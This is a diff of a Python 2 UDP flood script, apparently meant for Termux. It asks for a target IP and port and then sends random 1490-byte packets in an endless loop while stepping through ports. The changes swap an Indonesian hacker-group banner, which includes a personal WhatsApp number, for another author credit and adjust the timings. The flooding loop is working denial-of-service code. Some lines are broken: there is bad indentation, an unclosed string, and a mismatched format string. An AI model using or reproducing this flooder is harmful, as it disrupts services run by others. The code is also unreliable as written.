@@ -18,34 +18,32 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet ATTACK TOOLS DOS")
+os.system("figlet Hello!!")
 print
-    print "-------------------PROFIL CREATOR SCRIPT TERMUX DDOS--------------------"
-    print "NAMA KETUA KELOMPOK : VANNEZZ × JAVA 
-    print "NOMOR WHATSAPP      : +6285171197674 / REPUBLIK INDONESIA'
-    print "ORGANISASI          : DARK HAT YOGYAKARTA"
-    print "------------TEAM SECURITY REPUBLIK INDONESIA NEGARA PANCASILA------------"
+   print"[+] AUTHOR    : JavaXploit - Indo"
+   print"[+] COMMUNITY : Secure - Protect - Cyber S.C.P"
+   print"[+] GITHUB    : -"
 print
-ip = raw_input("IP / HOST TARGET ? : ")
-port = input("PORT NYA ?     : ")
+ip = raw_input("IP ADDRES : ")
+port = input("PORT : ")
 
 os.system("clear")
-os.system("figlet Mengirim Malware")
+os.system("figlet Send to Packet")
 print "[                    ] 0% "
-time.sleep(5)
+time.sleep(2)
 print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
 time.sleep(3)
+print "[==========          ] 50%"
+time.sleep(4)
+print "[===============     ] 75%"
+time.sleep(1)
+print "[====================] 100%"
+time.sleep(2)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Mengirim %s Bug Bot HW %s Ke Port:%s"%(sent,ip,port)
+     sent = sent + 100
+     port = port + 100
+     print "ATTACK%ATTACK%ATTACK:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
